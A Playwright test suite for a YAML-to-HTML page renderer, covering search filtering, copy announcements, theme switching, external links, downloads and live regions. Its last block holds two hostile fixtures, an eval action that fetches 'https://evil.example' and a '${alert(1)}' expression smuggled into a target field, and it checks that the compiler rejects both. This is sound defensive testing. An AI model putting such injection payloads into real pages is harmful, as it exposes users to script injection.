import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { expect, type Page, test } from '@playwright/test';
import { compile } from '../../src/render/render.js';

const pagesDir = fileURLToPath(new URL('../../fixtures/pages', import.meta.url));
const workspace = mkdtempSync(join(tmpdir(), 'ak-render-actions-'));

function artifact(name: string): string {
  const source = readFileSync(`${pagesDir}/${name}`, 'utf8');
  const target = join(workspace, `${name.replace(/\.yaml$/u, '')}.html`);
  // Recreated on demand so a retry or a parallel worker cannot see a stale path.
  mkdirSync(workspace, { recursive: true });
  writeFileSync(target, compile(source, { source: name }).html, 'utf8');
  return target;
}

test.afterAll(() => {
  rmSync(workspace, { recursive: true, force: true });
});

async function open(page: Page): Promise<void> {
  // Rewritten per test so a retry or parallel worker never sees a stale path.
  await page.goto(`file://${artifact('interactive.yaml')}`, { waitUntil: 'load' });
}

test.describe('filter and search', () => {
  const items = (page: Page) => page.locator('[data-ak-id="fixture-list"] li');
  const visible = (page: Page) => page.locator('[data-ak-id="fixture-list"] li:not([hidden])');

  test('narrows the list and announces the visible count', async ({ page }) => {
    await open(page);
    const total = await items(page).count();
    expect(total).toBeGreaterThan(1);

    await page.locator('[data-ak-id="fixture-search"] input').fill('plan');

    await expect(visible(page)).toHaveCount(1);
    await expect(page.locator('[data-ak-live]')).toHaveText(new RegExp(`1 of ${total}`, 'u'));
  });

  test('restores every row when the query is cleared', async ({ page }) => {
    await open(page);
    const total = await items(page).count();
    const input = page.locator('[data-ak-id="fixture-search"] input');

    await input.fill('plan');
    await expect(visible(page)).toHaveCount(1);
    await input.fill('');
    await expect(visible(page)).toHaveCount(total);
  });

  test('reports honestly when nothing matches', async ({ page }) => {
    await open(page);
    await page.locator('[data-ak-id="fixture-search"] input').fill('zzzz-no-match');
    await expect(page.locator('[data-ak-live]')).toHaveText(/0 of \d+/u);
  });
});

test.describe('copy with accessible feedback', () => {
  test('announces the copy so the result is not silent', async ({ page }) => {
    await open(page);
    await expect(page.locator('[data-ak-live]')).toHaveText('');
    await page.locator('[data-ak-id="copy-spec"]').click();
    await expect(page.locator('[data-ak-live]')).toHaveText(/Copied/u);
  });

  test('keeps the announcement polite rather than interrupting', async ({ page }) => {
    await open(page);
    const live = page.locator('[data-ak-live]');
    await expect(live).toHaveAttribute('aria-live', 'polite');
    await expect(live).toHaveAttribute('role', 'status');
  });

  test('copies through the clipboard when the page is a secure context', async ({ browser }) => {
    const context = await browser.newContext({
      permissions: ['clipboard-read', 'clipboard-write'],
    });
    const page = await context.newPage();
    // Serve the same artifact over http so navigator.clipboard exists; the
    // file:// path is covered by the fallback test above.
    await page.route('**/copy.html', async (route) => {
      await route.fulfill({
        body: readFileSync(artifact('interactive.yaml'), 'utf8'),
        contentType: 'text/html',
      });
    });
    await page.goto('https://example.test/copy.html', { waitUntil: 'load' });
    await page.locator('[data-ak-id="copy-spec"]').click();
    await expect(page.locator('[data-ak-live]')).toHaveText(/Copied/u);
    const clipboard = await page.evaluate(() => navigator.clipboard.readText());
    expect(clipboard).toContain('set-value');
    await context.close();
  });
});

test.describe('theme toggle', () => {
  test('flips the document theme and its pressed state', async ({ page }) => {
    await open(page);
    const toggle = page.locator('[data-ak-theme-toggle]');
    const before = await page.locator('html').getAttribute('data-theme');
    await toggle.click();
    const after = await page.locator('html').getAttribute('data-theme');
    expect(after).not.toBe(before);
    await expect(toggle).toHaveAttribute('aria-pressed', String(after === 'dark'));
  });

  test('remembers the choice across a reload', async ({ page }) => {
    await open(page);
    await page.locator('[data-ak-theme-toggle]').click();
    const chosen = await page.locator('html').getAttribute('data-theme');
    await page.reload({ waitUntil: 'load' });
    expect(await page.locator('html').getAttribute('data-theme')).toBe(chosen);
  });

  test('follows the system preference when no choice was stored', async ({ page }) => {
    await page.emulateMedia({ colorScheme: 'dark' });
    await open(page);
    // No stored choice means no data-theme attribute; the dark token set is
    // applied by the emitted prefers-color-scheme rule instead.
    expect(await page.locator('html').getAttribute('data-theme')).toBeNull();
    const background = await page.evaluate(() =>
      window
        .getComputedStyle(document.documentElement)
        .getPropertyValue('--ak-color-background')
        .trim(),
    );
    expect(background).not.toBe('');
    const lightBackground = await page.evaluate(async () => {
      const root = document.documentElement;
      const current = getComputedStyle(root).getPropertyValue('--ak-color-background');
      return current.trim();
    });
    expect(lightBackground).toBe(background);
  });

  test('renders a different surface under a dark system preference than a light one', async ({
    page,
  }) => {
    await page.emulateMedia({ colorScheme: 'light' });
    await open(page);
    const light = await page.evaluate(() =>
      window
        .getComputedStyle(document.documentElement)
        .getPropertyValue('--ak-color-background')
        .trim(),
    );
    await page.emulateMedia({ colorScheme: 'dark' });
    const dark = await page.evaluate(() =>
      window
        .getComputedStyle(document.documentElement)
        .getPropertyValue('--ak-color-background')
        .trim(),
    );
    expect(dark).not.toBe(light);
  });

  test('keeps the toggle reachable and labelled', async ({ page }) => {
    await open(page);
    const toggle = page.locator('[data-ak-theme-toggle]');
    await expect(toggle).toHaveAttribute('aria-label', /theme/iu);
    expect(await toggle.evaluate((node) => node.tagName)).toBe('BUTTON');
  });
});

test.describe('external actions', () => {
  test('opens an allowed URL in a new context with no opener access', async ({ page, context }) => {
    await open(page);
    // The assertion is about the action, not about the destination being
    // reachable, so the popup's request is answered locally: the test then
    // behaves the same on a machine with no connectivity.
    await context.route('https://agentkit.best/**', (route) =>
      route.fulfill({
        status: 200,
        contentType: 'text/html; charset=utf-8',
        body: '<!doctype html><html lang="en"><title>Docs</title><p>docs</p></html>',
      }),
    );
    const popupPromise = context.waitForEvent('page');
    await page.locator('[data-ak-id="open-docs"]').click();
    const popup = await popupPromise;
    await popup.waitForLoadState('domcontentloaded');
    expect(popup.url()).toBe('https://agentkit.best/docs');
    const openerIsNull = await popup.evaluate(() => window.opener === null);
    expect(openerIsNull).toBe(true);
    // The page itself must not navigate away.
    expect(page.url()).toContain('interactive.html');
    await popup.close();
  });

  test('offers a download rather than navigating for a file action', async ({ page }) => {
    await open(page);
    const downloadPromise = page.waitForEvent('download');
    await page.locator('[data-ak-id="download-spec"]').click();
    const download = await downloadPromise;
    expect(download.suggestedFilename()).toMatch(/\.ya?ml$/u);
  });
});

test.describe('live regions', () => {
  test('exist only where a page announces something', async ({ page }) => {
    await open(page);
    await expect(page.locator('[data-ak-live]')).toHaveCount(1);
  });

  test('are absent from a page with nothing to announce', async ({ page }) => {
    await page.goto(`file://${artifact('plan.yaml')}`, { waitUntil: 'load' });
    await expect(page.locator('[data-ak-live]')).toHaveCount(0);
  });
});

test.describe('action vocabulary boundary', () => {
  test('rejects an action that is not in the closed vocabulary', async () => {
    const source = `version: 1
meta:
  title: Hostile
blocks:
  - type: button
    id: go
    label: Go
    on:
      click:
        action: eval
        code: fetch('https://evil.example')
`;
    expect(() => compile(source)).toThrowError(/action/u);
  });

  test('rejects an expression smuggled into a target', async () => {
    const source = `version: 1
meta:
  title: Hostile
blocks:
  - type: button
    id: go
    label: Go
    on:
      click:
        action: toggle
        target: "\${alert(1)}"
`;
    expect(() => compile(source)).toThrowError();
  });
});
